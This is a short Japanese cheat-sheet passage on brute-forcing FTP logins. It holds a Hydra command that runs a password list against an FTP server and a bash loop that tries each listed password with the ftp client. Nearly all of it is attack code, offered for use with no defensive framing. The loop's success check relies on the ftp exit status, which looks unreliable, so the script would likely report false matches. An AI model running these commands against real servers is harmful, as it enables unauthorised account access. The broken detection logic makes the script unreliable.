#### FTPブルートフォース攻撃
```bash
# Hydraを使用したFTPブルートフォース攻撃
hydra -l username -P /path/to/passwordlist.txt ftp://ftp.example.com
```
- **-l**: 単一のユーザー名を指定します。
- **-P**: パスワードリストファイルを指定します。

#### FTPブルートフォーススクリプト
```bash
for password in $(cat /path/to/passwordlist.txt); do
    echo "Trying password: $password"
    ftp -inv ftp.example.com << EOF
    user username $password
    bye
EOF
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        break
    fi
done
```
- /path/to/passwordlist.txt  パスワードリスト
- **ftp**: FTPクライアントコマンドです。
- **-i**: インタラクティブモードを無効にします。
- **-n**: 自動的なログインを無効にします。
- **-v**: 詳細な出力を表示します。